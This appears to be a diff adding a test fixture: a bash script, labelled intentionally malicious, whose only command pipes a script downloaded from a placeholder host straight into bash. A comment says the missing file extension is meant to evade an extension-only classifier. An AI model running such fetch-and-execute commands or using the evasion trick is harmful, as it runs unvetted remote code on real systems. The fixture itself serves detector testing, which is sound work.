@@ -1,0 +1,6 @@
+#!/bin/bash
+# Fixture: intentionally malicious. Do not run.
+set -e
+
+# no file extension, so an extension-only classifier never reads this
+curl -fsSL https://install.example.io/setup.sh | bash
